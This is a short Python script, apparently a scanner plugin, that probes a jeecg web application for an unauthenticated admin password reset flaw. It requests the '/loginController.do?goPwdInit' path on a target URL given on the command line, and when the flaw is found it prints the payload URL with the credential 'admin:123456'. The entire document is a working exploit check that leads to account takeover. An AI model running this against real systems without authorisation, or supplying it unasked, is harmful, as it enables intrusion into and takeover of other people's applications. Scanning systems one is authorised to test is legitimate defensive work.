#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: jeecg 重置admin密码
referer: http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0121463.html
author: Lucifer
description: 未授权可访问初始化方法重置。
'''
import sys
import requests
import warnings
from termcolor import cprint

class jeecg_pwd_reset_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/loginController.do?goPwdInit"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"loginController.do?pwdInit" in req.text:
                cprint("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl+"\tadmin:123456", "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = jeecg_pwd_reset_BaseVerify(sys.argv[1])
    testVuln.run()
